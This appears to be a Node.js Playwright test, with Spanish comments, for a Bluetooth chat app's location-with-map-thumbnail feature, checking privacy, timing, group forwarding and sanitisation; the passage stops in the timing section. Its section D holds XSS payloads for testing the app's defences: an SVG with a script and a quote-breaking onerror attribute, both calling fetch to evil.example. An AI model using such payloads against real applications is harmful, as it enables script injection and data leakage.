// 3201 (dueño 17-11: miniatura del mapa al mandar la ubicación; eligió la opción A). Hasta la 3198 una ubicación se pintaba como una
// tarjeta LOCAL (degradado + pin + coordenadas), sin mapa, a propósito: en la auditoría del 03-11 se quitó un <img> a un servidor de
// mapas que filtraba la ubicación recibida y la IP de quien MIRA en cada pintado. Opción A: el teléfono que MANDA baja UNA vez las
// teselas de OpenStreetMap que cubren la zona, arma la miniatura (pin, círculo de precisión, «© OpenStreetMap») y la mete DENTRO del
// mensaje cifrado (meta.map); quien la recibe la ve sin pedir nada a ningún servidor. Chromium real (canvas, createImageBitmap, WebP),
// tres teléfonos por Bluetooth simulado y el servidor de teselas simulado con page.route (PNG locales con aspecto de OSM).
//  A  con «internet», A manda su ubicación a B: A pide 2–4 teselas z16 que cubren el punto (y nada más); B ve la miniatura (imagen en
//     base64, 480×270, con el pin rojo en el centro y el crédito abajo a la derecha) en lugar del degradado, con Maps/Waze como antes;
//     la miniatura es chica (≤ 12 000 caracteres: el mensaje cifrado cabe en UN paquete por internet);
//  B  B no hace NINGUNA petición fuera de la app (ni a tile.openstreetmap.org ni a otro host) al recibir, pintar, reabrir el chat ni
//     tras reiniciar la app (y C tampoco en toda la prueba);
//  C  el servidor de teselas no contesta: la ubicación sale igual, sin mapa, a los ~4 s (con el aviso «Preparando el mapa…»); A sin
//     internet, o con Tor puesto a mano (privacidad): sale al momento, sin mapa y sin pedir nada; B ve la tarjeta de siempre;
//  D  un meta.map malicioso (SVG con script, data:text/html, una URL https://…, comillas para colarse en el HTML, y una imagen de 2 MB)
//     se ignora: tarjeta local, sin <img> ni SVG ajeno, sin peticiones, y el vault no lo guarda (también lo que llega a B por radio);
//  E  en un GRUPO (A, B, C) la ubicación lleva el mapa y lo ven B y C; B REENVÍA a C la ubicación que le mandó A: C la recibe con el
//     MISMO mapa y B no pide ninguna tesela (hasta la 3198 una ubicación RECIBIDA 1-a-1 se reenviaba como texto: C veía el JSON);
//  F  el mensaje con mapa tarda poco más que antes: en salir (burbuja en A) y en llegar a B, comparado con el que sale sin mapa.
// Contraprueba: en la 3198 fallan A, B y E (no hay mapa; el reenvío llega a C como texto con el JSON), C (no espera ni avisa: no hay
// mapa que esperar) y D (el vault guarda el meta.map malicioso, también los 2,8 MB); F pasa.
// Uso: node mapaubicacion.js <dir_build> [--shot=<png de la burbuja de B>]
'use strict';
const fs = require('fs');
const path = require('path');
const { PW, bootPhone, sleep } = require('./pw_harness');
const { Radio, NativePhone } = require('./native_mock');

const dist = path.resolve(process.argv[2], 'dist');
const shotArg = (process.argv.find((x) => x.startsWith('--shot=')) || '').slice(7);
const LAT = 19.4326, LNG = -99.1332, ACC = 25;
const logs = [];
const r = { prueba: 'mapaubicacion', build: path.basename(process.argv[2]) };
const fin = (extra) => {
  Object.assign(r, extra || {});
  r.errores = logs.filter((l) => /PAGEERROR/.test(l)).slice(0, 5);
  r.resultado = (r.A_ok && r.B_ok && r.C_ok && r.D_ok && r.E_ok && r.F_ok && !r.errores.length) ? 'OK' : 'FALLO';
  console.log('MAPAUBICACION ' + JSON.stringify(r));
  try { fs.writeFileSync(path.join(__dirname, 'last_logs_mapaubicacion.txt'), logs.join('\n')); } catch (e) {}
};
async function waitFor(fn, ms) { const t0 = Date.now(); while (Date.now() - t0 < ms) { try { if (await fn()) return Math.round((Date.now() - t0) / 100) / 10; } catch (e) {} await sleep(150); } return null; }

// Tesela sintética con el aspecto de las de OpenStreetMap estándar (fondo, manzanas, edificios, parques, calles con borde, avenidas,
// nombres): continua entre teselas (todo sale de coordenadas globales). Se dibuja en una página aparte y se sirve como PNG.
const TILEGEN = `window.__tile = function (z, tx, ty) {
  const c = document.createElement('canvas'); c.width = 256; c.height = 256;
  const g = c.getContext('2d'); const X0 = tx * 256, Y0 = ty * 256;
  const h = (a, b) => { let x = (a * 374761393 + b * 668265263 + z * 2246822519) | 0; x = (x ^ (x >>> 13)) * 1274126177 | 0; return ((x ^ (x >>> 16)) >>> 0) / 4294967296; };
  g.fillStyle = '#f2efe9'; g.fillRect(0, 0, 256, 256);
  const vx = [], hy = [];
  for (let k = Math.floor(X0 / 88) - 1; k <= Math.floor((X0 + 256) / 88) + 1; k++) vx.push({ k, x: k * 88 + Math.floor(h(k, 7) * 26) - X0, major: (k % 4 + 4) % 4 === 0 });
  for (let k = Math.floor(Y0 / 74) - 1; k <= Math.floor((Y0 + 256) / 74) + 1; k++) hy.push({ k, y: k * 74 + Math.floor(h(9, k) * 22) - Y0, major: (k % 5 + 5) % 5 === 0 });
  for (let i = 0; i < vx.length - 1; i++) for (let j = 0; j < hy.length - 1; j++) {
    const ax = vx[i].x + 6, bx = vx[i + 1].x - 6, ay = hy[j].y + 6, by = hy[j + 1].y - 6;
    if (bx <= ax || by <= ay) continue;
    const q = h(vx[i].k * 31, hy[j].k * 17);
    if (q < 0.08) { g.fillStyle = '#c8facc'; g.fillRect(ax, ay, bx - ax, by - ay); g.fillStyle = '#add19e'; for (let t = 0; t < 6; t++) { g.beginPath(); g.arc(ax + h(t, vx[i].k) * (bx - ax), ay + h(hy[j].k, t) * (by - ay), 3, 0, 7); g.fill(); } continue; }
    if (q < 0.11) { g.fillStyle = '#aad3df'; g.fillRect(ax, ay, bx - ax, by - ay); continue; }
    g.fillStyle = '#e0dfdf'; g.fillRect(ax, ay, bx - ax, by - ay);
    for (let bxi = ax + 2; bxi < bx - 6; bxi += 9 + Math.floor(h(bxi + X0, ay + Y0) * 8)) for (const top of [true, false]) {
      const bw = 7 + Math.floor(h(bxi + X0, top ? 1 : 2) * 8), bh = 9 + Math.floor(h(top ? 3 : 4, bxi + X0) * 12), yy = top ? ay + 2 : by - 2 - bh;
      g.fillStyle = '#d9d0c9'; g.fillRect(bxi, yy, Math.min(bw, bx - bxi - 2), bh);
      g.strokeStyle = '#c4b6ab'; g.lineWidth = 1; g.strokeRect(bxi + 0.5, yy + 0.5, Math.min(bw, bx - bxi - 2) - 1, bh - 1);
    }
  }
  const road = (x1, y1, x2, y2, major) => {
    g.strokeStyle = major ? '#c8a27a' : '#c9c4bd'; g.lineWidth = major ? 12 : 8; g.beginPath(); g.moveTo(x1, y1); g.lineTo(x2, y2); g.stroke();
    g.strokeStyle = major ? '#fcd6a4' : '#ffffff'; g.lineWidth = major ? 10 : 6; g.beginPath(); g.moveTo(x1, y1); g.lineTo(x2, y2); g.stroke();
  };
  vx.forEach((v) => road(v.x, -10, v.x, 266, v.major)); hy.forEach((v) => road(-10, v.y, 266, v.y, v.major));
  const names = ['Av. Juárez', 'Madero', '5 de Mayo', 'Bolívar', 'Isabel la Católica', 'Venustiano Carranza', 'República de Uruguay', 'Motolinía', 'Palma', 'Gante', 'Tacuba', 'Donceles', 'Allende', 'Regina'];
  g.font = '10px sans-serif'; g.textBaseline = 'middle';
  const label = (txt, x, y, rot) => { g.save(); g.translate(x, y); if (rot) g.rotate(-Math.PI / 2); g.lineWidth = 3; g.strokeStyle = 'rgba(255,255,255,0.9)'; g.strokeText(txt, 0, 0); g.fillStyle = '#333'; g.fillText(txt, 0, 0); g.restore(); };
  hy.forEach((v) => label(names[(v.k % names.length + names.length) % names.length], Math.floor(h(v.k, 3) * 120) + 20, v.y, false));
  vx.forEach((v) => label(names[(v.k * 3 % names.length + names.length) % names.length], v.x, Math.floor(h(5, v.k) * 120) + 120, true));
  for (let t = 0; t < 2; t++) { const px = h(tx, ty * 3 + t) * 230 + 10, py = h(ty, tx * 5 + t) * 230 + 10; g.fillStyle = '#734a08'; g.beginPath(); g.arc(px, py, 3, 0, 7); g.fill(); label(['Café', 'Farmacia', 'Museo', 'Banco'][t + (tx & 1) * 2], px + 6, py, false); }
  return c;
};`;

(async () => {
  const browser = await PW.chromium.launch();
  const tilePage = await browser.newPage();
  await tilePage.setContent('<html><body></body></html>');
  await tilePage.addScriptTag({ content: TILEGEN });
  const tileCache = new Map();
  const tilePng = async (z, x, y) => {
    const k = z + '/' + x + '/' + y;
    if (!tileCache.has(k)) tileCache.set(k, Buffer.from((await tilePage.evaluate(([a, b, c]) => window.__tile(a, b, c).toDataURL('image/png'), [z, x, y])).split(',')[1], 'base64'));
    return tileCache.get(k);
  };

  const radio = new Radio();
  const opts = { readsContentFallback: true, retain: ['onPayloadReceived'], closeOnNoService: true, pace: [5, 5], ioDelay: 10, asymmetric: true, noTor: true };
  const nA = new NativePhone('A', 'AA:AA:AA:AA:AA:01', opts), nB = new NativePhone('B', 'BB:BB:BB:BB:BB:02', opts), nC = new NativePhone('C', 'CC:CC:CC:CC:CC:03', opts);
  [nA, nB, nC].forEach((n) => { radio.add(n); n.load(); });
  const A = (await bootPhone(browser, 'A', nA, dist, { phone: true, logs, seedName: 'Ana', lang: 'es' })).page;
  let B = (await bootPhone(browser, 'B', nB, dist, { phone: true, logs, seedName: 'Beto', lang: 'es' })).page;
  const C = (await bootPhone(browser, 'C', nC, dist, { phone: true, logs, seedName: 'Caro', lang: 'es' })).page;
  const idOf = (p) => p.evaluate(() => String(window.bleInterface.localNexoId || '').toLowerCase());
  const idA = await idOf(A), idB = await idOf(B), idC = await idOf(C);

  // --- el servidor de teselas (solo lo puede usar A); todo lo que B y C piden fuera de su app queda anotado ---
  let tileMode = 'ok';
  const tilesA = [];
  await A.route('https://tile.openstreetmap.org/**', async (route) => {
    const u = route.request().url(); tilesA.push({ u, mode: tileMode, h: route.request().headers() });
    const m = /\/(\d+)\/(\d+)\/(\d+)\.png$/.exec(u);
    if (tileMode === 'hang') { setTimeout(() => route.abort().catch(() => {}), 9000); return; }
    if (!m) { route.fulfill({ status: 404, body: '' }); return; }
    route.fulfill({ status: 200, contentType: 'image/png', headers: { 'access-control-allow-origin': '*', 'cache-control': 'max-age=604800' }, body: await tilePng(+m[1], +m[2], +m[3]) });
  });
  const outside = { B: [], C: [] };
  const watch = (p, name) => {
    p.on('request', (q) => { const u = q.url(); if (/^(data|blob):/.test(u) || u.indexOf('https://' + name.toLowerCase() + '.nexo.test/') === 0) return; outside[name].push(u.substring(0, 120)); });
    return p.route('https://tile.openstreetmap.org/**', (route) => route.abort().catch(() => {}));
  };
  await watch(B, 'B'); await watch(C, 'C');
  await A.evaluate(([lat, lng, acc]) => {
    window.__gps = { lat, lng, acc };
    window.Capacitor.Plugins.Geolocation = {
      checkPermissions: async () => ({ location: 'granted' }), requestPermissions: async () => ({ location: 'granted' }),
      getCurrentPosition: async () => ({ coords: { latitude: window.__gps.lat, longitude: window.__gps.lng, accuracy: window.__gps.acc } }),
    };
  }, [LAT, LNG, ACC]);

  // --- emparejar A con B y con C (Bluetooth) ---
  const click = (p, sel) => p.evaluate((s) => { const e = document.querySelector(s); if (e) e.click(); return !!e; }, sel);
  await A.evaluate(() => window.bleInterface.togglePanel());
  for (let n = 0; n < 2; n++) {
    for (let i = 0; i < 150; i++) { await sleep(150); if (await A.evaluate(() => !!document.querySelector('#ble-new-device button'))) break; await A.evaluate(() => { if (!window.bleInterface.isScanning) { const b = document.getElementById('ble-scan-btn'); if (b) b.click(); } }); }
    await click(A, '#ble-new-device button'); await sleep(2200);
  }
  await A.evaluate(() => { if (document.getElementById('ble-panel').classList.contains('active')) window.bleInterface.togglePanel(); });
  // abre el chat como al tocar su fila en Contactos (ble_ui.js: openChat del NEXO ID o del grupo)
  const openChat = (p, id) => p.evaluate((x) => { if (!x || !window.bleInterface || typeof window.bleInterface.openChat !== 'function') return false; window.bleInterface.openChat(x); return true; }, id).then(async (ok) => { await sleep(900); return ok; });
  const closeChat = async (p) => { await p.evaluate(() => window.dispatchEvent(new CustomEvent('nexo:ble:closeChat', { detail: {} }))); await sleep(400); };
  const sendText = (p, t) => p.evaluate((x) => { const i = document.getElementById('message-input'); i.value = x; i.dispatchEvent(new Event('input', { bubbles: true })); document.getElementById('send-btn').click(); }, t);
  r.chat_A_B = await openChat(A, idB);
  await sendText(A, 'hola B'); await sleep(2500);
  await closeChat(A);
  r.chat_A_C = await openChat(A, idC);
  await sendText(A, 'hola C'); await sleep(2500);
  await closeChat(A);
  await waitFor(() => B.evaluate(() => !!document.querySelector('#main-contacts-list .ble-contact-row')), 15000);

  // Ubicaciones guardadas en un chat (vault) y lo que se ve en las burbujas de ubicación del chat abierto
  const locsIn = (p, cid) => p.evaluate(async (c) => (await window.vaultLoadMessages(c)).filter((m) => m.attachmentType === 'location' || /"attachmentType":"location"/.test(String(m.content || ''))).map((m) => {
    let meta = m.attachmentMeta || null;
    if ((!meta || !('map' in meta)) && /^\{/.test(String(m.content || ''))) { try { const o = JSON.parse(m.content); meta = o.meta || meta; } catch (e) {} }
    const mapInContent = /"map"/.test(String(m.content || '')), mapInMeta = !!(m.attachmentMeta && 'map' in m.attachmentMeta);
    return { id: m.msgId || m.messageId, own: !!m._own, map: meta && typeof meta.map === 'string' ? meta.map : null, mapKey: mapInContent || mapInMeta, len: String(m.content || '').length, ts: m.timestamp };
  }), cid);
  const bubblesLoc = (p) => p.evaluate(() => Array.from(document.querySelectorAll('#messages-container .message')).filter((m) => /Ubicaci[oó]n/.test(m.textContent) && /Waze/.test(m.textContent)).map((m) => {
    const im = m.querySelector('img.nx-loc-map');
    const imgs = Array.from(m.querySelectorAll('img')).map((i) => (i.getAttribute('src') || '').substring(0, 30));
    const svgs = m.querySelectorAll('svg').length;
    const a = Array.from(m.querySelectorAll('a')).map((x) => x.getAttribute('href'));
    return { id: m.dataset.msgId, mapa: !!im, src: im ? im.getAttribute('src').substring(0, 23) : '', ancho: im ? Math.round(im.getBoundingClientRect().width) : 0, alto: im ? Math.round(im.getBoundingClientRect().height) : 0, imgs, svgs, maps: a.some((h) => /google\.com\/maps/.test(h || '')), waze: a.some((h) => /waze\.com/.test(h || '')), degradado: !!m.querySelector('[style*="linear-gradient(135deg, rgb(26, 26, 46)"], [style*="linear-gradient(135deg,#1a1a2e"]') };
  }));
  // Pin rojo en el centro y crédito abajo a la derecha (píxeles de la imagen que se ve en la burbuja)
  const inspectMap = (p, msgId) => p.evaluate(async (id) => {
    const im = document.querySelector('#messages-container .message[data-msg-id="' + id + '"] img.nx-loc-map');
    if (!im) return null;
    try { await im.decode(); } catch (e) {}
    const W = im.naturalWidth, H = im.naturalHeight, c = document.createElement('canvas'); c.width = W; c.height = H;
    const g = c.getContext('2d'); g.drawImage(im, 0, 0);
    const px = (x0, y0, w, h, f) => { const d = g.getImageData(x0, y0, w, h).data; let n = 0; for (let i = 0; i < d.length; i += 4) if (f(d[i], d[i + 1], d[i + 2])) n++; return n; };
    const red = (r, gg, b) => r > 200 && gg < 120 && b < 110;
    const pinCentro = px(Math.round(W / 2 - W * 0.05), Math.round(H / 2 - H * 0.2), Math.round(W * 0.1), Math.round(H * 0.18), red);
    const pinFuera = px(0, 0, Math.round(W * 0.3), Math.round(H * 0.3), red) + px(Math.round(W * 0.7), 0, Math.round(W * 0.3), Math.round(H * 0.3), red);
    const cw = Math.round(W * 0.32), ch = Math.round(H * 0.1);
    const claro = px(W - cw, H - ch, cw, ch, (r, gg, b) => r > 225 && gg > 225 && b > 225), oscuro = px(W - cw, H - ch, cw, ch, (r, gg, b) => r < 110 && gg < 110 && b < 110);
    const azul = px(Math.round(W / 2 - 30), Math.round(H / 2 - 4), 60, 24, (r, gg, b) => b > r + 25 && b > gg);
    return { W, H, pinCentro, pinFuera, credito_claro: claro, credito_oscuro: oscuro, area_credito: cw * ch, circulo_azul: azul };
  }, msgId);
  const sendLocation = async (p) => { await p.evaluate(() => { const b = document.querySelector('.attach-menu-item[data-type="location"]'); b.dispatchEvent(new MouseEvent('click', { bubbles: true })); }); };
  // Manda la ubicación desde el chat abierto de A; tiempos: burbuja en A y llegada a `to` (en el chat cid)
  const timedLocation = async (cid, to, toCid) => {
    const before = (await locsIn(A, cid)).length, beforeTo = (await locsIn(to, toCid)).length;
    const toasts = [];
    const t0 = Date.now();
    await sendLocation(A);
    let enA = null, enTo = null;
    while (Date.now() - t0 < 45000 && (enA === null || enTo === null)) {
      await sleep(100);
      const tt = await A.evaluate(() => ((document.getElementById('perm-error-toast') || {}).textContent || '')).catch(() => '');
      if (tt && toasts.indexOf(tt) < 0) toasts.push(tt);
      if (enA === null && (await locsIn(A, cid)).length > before) enA = (Date.now() - t0) / 1000;
      if (enTo === null && (await locsIn(to, toCid)).length > beforeTo) enTo = (Date.now() - t0) / 1000;
    }
    const mine = (await locsIn(A, cid)).slice(-1)[0] || null, got = (await locsIn(to, toCid)).slice(-1)[0] || null;
    return { enA, enTo, mine, got, toasts };
  };

  // ================= A: con internet, A → B =================
  outside.B.length = 0; outside.C.length = 0;
  r.nombres = { A: await A.evaluate(() => window.vaultLoadContacts().map((c) => c.name)), B: await B.evaluate(() => window.vaultLoadContacts().map((c) => c.name)) };
  await openChat(A, idB);
  const a1 = await timedLocation(idB, B, idA);
  r.A_tiempos = { burbuja_A_s: a1.enA, llega_B_s: a1.enTo };
  r.A_teselas = tilesA.map((x) => x.u.replace('https://tile.openstreetmap.org', ''));
  const mapA = a1.mine && a1.mine.map;
  r.A_mapa_en_A = !!mapA && /^data:image\/webp;base64,/.test(mapA);
  r.A_mapa_chars = mapA ? mapA.length : 0;
  r.A_mapa_KB = mapA ? Math.round(mapA.length * 3 / 4 / 102.4) / 10 : 0;
  r.A_mapa_llega_igual = !!(a1.got && a1.got.map && a1.got.map === mapA);
  // las teselas: z16, las que cubren una ventana de 240×135 alrededor del punto (2–4), una sola vez y sin cabeceras no-cache
  const n16 = 256 * Math.pow(2, 16), wx = (LNG + 180) / 360 * n16, la = LAT * Math.PI / 180, wy = (1 - Math.log(Math.tan(la) + 1 / Math.cos(la)) / Math.PI) / 2 * n16;
  const want = []; for (let ty = Math.floor((Math.round(wy - 67.5)) / 256); ty <= Math.floor((Math.round(wy - 67.5) + 134) / 256); ty++) for (let tx = Math.floor(Math.round(wx - 120) / 256); tx <= Math.floor((Math.round(wx - 120) + 239) / 256); tx++) want.push('/16/' + tx + '/' + ty + '.png');
  r.A_teselas_esperadas = want;
  r.A_sin_nocache = tilesA.every((x) => !/no-cache|no-store/i.test((x.h['cache-control'] || '') + (x.h.pragma || '')));
  r.A_sin_cookies = tilesA.every((x) => !x.h.cookie);
  r.A_cabeceras = tilesA.length ? { referer: tilesA[0].h.referer || '', origin: tilesA[0].h.origin || '', cache_control: tilesA[0].h['cache-control'] || '' } : null;
  const teselasOk = tilesA.length >= 2 && tilesA.length <= 4 && want.length === tilesA.length && want.every((w) => r.A_teselas.indexOf(w) >= 0);
  // en B: la burbuja con la miniatura
  await openChat(B, idA);
  await waitFor(async () => (await bubblesLoc(B)).length >= 1, 8000);
  const bB = (await bubblesLoc(B)).slice(-1)[0] || {};
  r.A_burbuja_B = bB;
  r.A_pixeles_B = bB.id ? await inspectMap(B, bB.id) : null;
  const px = r.A_pixeles_B || {};
  r.A_pin_y_credito = !!px.W && px.W === 480 && px.H === 270 && px.pinCentro > 60 && px.pinFuera === 0 && px.credito_claro > px.area_credito * 0.3 && px.credito_oscuro > 30 && px.circulo_azul > 20;
  r.A_ok = teselasOk && r.A_sin_nocache && r.A_sin_cookies && r.A_mapa_en_A && r.A_mapa_llega_igual && r.A_mapa_chars <= 12000 &&
    !!bB.mapa && bB.src === 'data:image/webp;base64,' && !bB.degradado && bB.maps && bB.waze && bB.ancho >= 200 && Math.abs(bB.ancho / Math.max(1, bB.alto) - 16 / 9) < 0.1 && r.A_pin_y_credito;
  if (shotArg) {
    try {
      const loc = B.locator('#messages-container .message[data-msg-id="' + bB.id + '"]');
      await loc.scrollIntoViewIfNeeded(); await sleep(300);
      await loc.screenshot({ path: shotArg });
      await B.screenshot({ path: shotArg.replace(/\.png$/, '_chat.png') });
      r.captura = shotArg;
    } catch (e) { r.captura_error = String(e.message).slice(0, 100); }
  }

  // ================= B: quien recibe no pide nada a nadie (recibir, pintar, reabrir, reiniciar) =================
  await closeChat(B); await openChat(B, idA); await sleep(800);
  const reabierto = (await bubblesLoc(B)).slice(-1)[0] || {};
  await B.reload();
  await B.waitForFunction(() => window.NEXO && window.NEXO.initialized, null, { timeout: 60000 });
  await sleep(1500);
  await openChat(B, idA); await sleep(1200);
  const reiniciado = (await bubblesLoc(B)).slice(-1)[0] || {};
  r.B_reabrir_con_mapa = !!reabierto.mapa;
  r.B_reiniciar_con_mapa = !!reiniciado.mapa;
  r.B_peticiones_fuera_B = outside.B.slice(0, 5);

  // ================= C: el servidor de teselas no contesta / A sin internet =================
  await sleep(3200); // freno de 3 s entre dos ubicaciones
  tileMode = 'hang';
  const nTilesBefore = tilesA.length;
  const c1 = await timedLocation(idB, B, idA);
  r.C_cuelga = { burbuja_A_s: c1.enA, llega_B_s: c1.enTo, con_mapa: !!(c1.mine && c1.mine.map), avisos: c1.toasts, teselas_pedidas: tilesA.length - nTilesBefore };
  const c1ok = c1.enA !== null && c1.enA >= 3.8 && c1.enA <= 6 && !(c1.mine && c1.mine.map) && !!c1.got && !(c1.got && c1.got.mapKey) && c1.toasts.some((x) => /Preparando el mapa/.test(x));
  await sleep(3200);
  await A.context().setOffline(true);
  const nTiles2 = tilesA.length;
  const c2 = await timedLocation(idB, B, idA);
  await A.context().setOffline(false);
  r.C_sin_internet = { burbuja_A_s: c2.enA, llega_B_s: c2.enTo, con_mapa: !!(c2.mine && c2.mine.map), teselas_pedidas: tilesA.length - nTiles2, avisos: c2.toasts };
  const c2ok = c2.enA !== null && c2.enA <= 1.5 && !(c2.mine && c2.mine.map) && !!c2.got && tilesA.length === nTiles2;
  // con Tor puesto a mano en Perfil (privacidad) tampoco se piden teselas: sale al momento, sin mapa
  await sleep(3200);
  r.C_tor_aplica = await A.evaluate(() => { const n = window.bleInterface && window.bleInterface.net; if (!n || !n.state) return false; window.__torAntes = n.state.tor; n.state.tor = true; return true; });
  const nTiles3 = tilesA.length;
  const c3 = await timedLocation(idB, B, idA);
  await A.evaluate(() => { const n = window.bleInterface.net; if (window.__torAntes === undefined) delete n.state.tor; else n.state.tor = window.__torAntes; });
  r.C_tor = { burbuja_A_s: c3.enA, con_mapa: !!(c3.mine && c3.mine.map), teselas_pedidas: tilesA.length - nTiles3 };
  const c3ok = r.C_tor_aplica && c3.enA !== null && c3.enA <= 1.5 && !(c3.mine && c3.mine.map) && !!c3.got && tilesA.length === nTiles3;
  await sleep(1500);
  const cardsB = (await bubblesLoc(B)).slice(-3);
  r.C_tarjetas_B = cardsB.map((x) => ({ mapa: x.mapa, degradado: x.degradado, imgs: x.imgs.length }));
  r.C_ok = c1ok && c2ok && c3ok && cardsB.length === 3 && cardsB.every((x) => !x.mapa && x.degradado && !x.imgs.length && x.maps && x.waze);
  tileMode = 'ok';

  // ================= D: meta.map malicioso =================
  const evil = {
    svg: 'data:image/svg+xml;base64,' + Buffer.from('<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><script>fetch("https://evil.example/x")</script><image href="https://evil.example/p.png"/></svg>').toString('base64'),
    html: 'data:text/html;base64,' + Buffer.from('<img src=https://evil.example/q.png><script>alert(1)</script>').toString('base64'),
    url: 'https://evil.example/mapa.png?lat=19.4326',
    comillas: 'data:image/png;base64,AAAA" onerror="fetch(\'https://evil.example/c\')" x="',
  };
  // por radio, como lo mandaría un cliente modificado (A, sin pasar por location.js)
  const idsAntes = (await locsIn(B, idA)).map((m) => m.id);
  for (const k of Object.keys(evil)) {
    await A.evaluate(([m, lat]) => { window.NEXO_sendAttachment('location', JSON.stringify({ lat, lng: -99.1, accuracy: 0 }), { lat, lng: -99.1, accuracy: 0, map: m }); }, [evil[k], LAT]);
    await sleep(300);
  }
  // y una imagen «válida» de 2 MB (directo al camino de recibir de B: guardar + avisar, como ble_receive.js)
  const bigId = 'msgevil2mb' + Date.now();
  await B.evaluate(async ([from, id]) => {
    const att = { type: 'attachment', attachmentType: 'location', payload: '{"lat":19.43,"lng":-99.1,"accuracy":0}', meta: { lat: 19.43, lng: -99.1, accuracy: 0, map: 'data:image/webp;base64,' + 'UklGR'.repeat(560000) } };
    const content = JSON.stringify(att);
    await window.vaultAppendMessage(from, { messageId: id, msgId: id, content, _own: false, status: 'delivered', timestamp: Date.now(), senderNexoId: from, senderName: 'Ana', attachmentType: null, attachmentPayload: null, attachmentMeta: null });
    window.dispatchEvent(new CustomEvent('nexo:ble:messageReceived', { detail: { deviceUUID: from, senderNexoId: from, senderName: 'Ana', content, messageId: id, msgId: id, timestamp: Date.now(), seq: 0 } }));
  }, [idA, bigId]);
  await waitFor(async () => (await locsIn(B, idA)).length >= idsAntes.length + 5, 30000);
  await sleep(1500);
  const allB = await locsIn(B, idA);
  const evilIds = allB.map((m) => m.id).filter((id) => idsAntes.indexOf(id) < 0);
  const stored = allB.filter((m) => evilIds.indexOf(m.id) >= 0);
  r.D_guardados = stored.map((m) => ({ id: m.id.substring(0, 14), mapKey: m.mapKey, len: m.len }));
  const vB = (await bubblesLoc(B)).filter((x) => evilIds.indexOf(x.id) >= 0);
  r.D_burbujas = vB.map((x) => ({ mapa: x.mapa, degradado: x.degradado, imgs: x.imgs, svgs: x.svgs }));
  r.D_peticiones_fuera_B = outside.B.slice(0, 5);
  r.D_ok = stored.length === 5 && stored.every((m) => !m.mapKey && m.len < 2000) && vB.length === 5 && vB.every((x) => !x.mapa && x.degradado && x.imgs.length === 0 && x.svgs === 1 && x.maps && x.waze);
  await closeChat(B);

  // ================= E: grupo (A, B, C) y reenvío B → C =================
  await closeChat(A);
  await A.evaluate(() => { const b = document.getElementById('nexo-new-group-btn'); if (b) b.click(); });
  await sleep(500);
  await A.evaluate(() => { const s = document.getElementById('nexo-group-sheet'); if (!s) return; s.querySelectorAll('.nexo-pick-row input').forEach((cb) => { cb.checked = true; cb.dispatchEvent(new Event('change')); }); const n = s.querySelector('#nexo-group-name'); n.value = 'Mapa'; n.dispatchEvent(new Event('input')); s.querySelector('#nexo-group-create').click(); });
  await sleep(800);
  const gid = await A.evaluate(() => Object.keys(window.bleInterface.groups.list)[0] || null);
  r.E_grupo = !!gid;
  await waitFor(() => B.evaluate((g) => !!(window.bleInterface.groups && window.bleInterface.groups.isGroup(g)), gid), 60000);
  await waitFor(() => C.evaluate((g) => !!(window.bleInterface.groups && window.bleInterface.groups.isGroup(g)), gid), 60000);
  await sleep(3500);
  const nTilesG = tilesA.length;
  const tG0 = Date.now();
  await sendLocation(A);
  r.E_grupo_llega_B_s = await waitFor(async () => (await locsIn(B, gid)).some((m) => m.map), 60000);
  r.E_grupo_llega_C_s = await waitFor(async () => (await locsIn(C, gid)).some((m) => m.map), 60000);
  const gA = (await locsIn(A, gid)).slice(-1)[0] || {}, gB = (await locsIn(B, gid)).slice(-1)[0] || {}, gC = (await locsIn(C, gid)).slice(-1)[0] || {};
  r.E_grupo_teselas = tilesA.length - nTilesG;
  r.E_grupo_s = Math.round((Date.now() - tG0) / 100) / 10;
  await openChat(C, gid); await sleep(800);
  const gbC = (await bubblesLoc(C)).slice(-1)[0] || {};
  r.E_grupo_burbuja_C = { mapa: gbC.mapa, ancho: gbC.ancho };
  const grupoOk = !!gid && !!gA.map && gB.map === gA.map && gC.map === gA.map && !!gbC.mapa && r.E_grupo_teselas >= 2 && r.E_grupo_teselas <= 4;
  await closeChat(C);
  // B reenvía a C la ubicación (con mapa) que le mandó A en 1-a-1
  const firstWithMap = (await locsIn(B, idA)).find((m) => m.map) || {};
  await openChat(B, idA); await sleep(800);
  await B.evaluate((id) => { const m = document.querySelector('#messages-container .message[data-msg-id="' + id + '"]'); if (m) m.dispatchEvent(new MouseEvent('contextmenu', { bubbles: true, cancelable: true })); }, firstWithMap.id || '');
  await waitFor(() => B.evaluate(() => !!document.querySelector('#nexo-msg-menu .mm-forward')), 5000);
  await click(B, '#nexo-msg-menu .mm-forward'); await sleep(500);
  const nameC = await B.evaluate((c) => ((window.vaultLoadContacts() || []).find((x) => String(x.nexoId || '').toLowerCase() === c) || {}).name || c.toUpperCase(), idC);
  r.E_reenvio_hoja = await B.evaluate((n) => { const row = Array.from(document.querySelectorAll('#nexo-forward-sheet .fw-row')).find((x) => x.textContent.trim() === n); if (!row) return false; const cb = row.querySelector('input'); cb.checked = true; cb.dispatchEvent(new Event('change')); document.querySelector('#nexo-forward-sheet .fw-send').click(); return true; }, nameC);
  r.E_reenvio_llega_C_s = await waitFor(async () => (await locsIn(C, idB)).some((m) => !!m.map), 60000);
  const fC = (await locsIn(C, idB)).slice(-1)[0] || {};
  r.E_reenvio_C_recibio = await C.evaluate(async (b) => { const l = (await window.vaultLoadMessages(b)).filter((m) => !m._own); const m = l[l.length - 1]; return m ? String(m.content || '').substring(0, 70) : null; }, idB);
  r.E_reenvio_mismo_mapa = !!fC.map && fC.map === firstWithMap.map;
  await openChat(C, idB); await sleep(800);
  const fbC = (await bubblesLoc(C)).slice(-1)[0] || {};
  r.E_reenvio_burbuja_C = { mapa: fbC.mapa };
  r.B_peticiones_fuera_B = outside.B.slice(0, 5);
  r.B_peticiones_fuera_C = outside.C.slice(0, 5);
  r.E_ok = grupoOk && r.E_reenvio_hoja && r.E_reenvio_mismo_mapa && !!fbC.mapa;
  r.B_ok = r.B_reabrir_con_mapa && r.B_reiniciar_con_mapa && outside.B.length === 0 && outside.C.length === 0;

  // ================= F: tarda poco más que antes =================
  // con mapa (A) frente a sin mapa (A sin internet, C); en el simulador la tesela llega al momento
  r.F_burbuja_extra_s = (a1.enA !== null && c2.enA !== null) ? Math.round((a1.enA - c2.enA) * 10) / 10 : null;
  r.F_llegada_extra_s = (a1.enTo !== null && c2.enTo !== null) ? Math.round((a1.enTo - c2.enTo) * 10) / 10 : null;
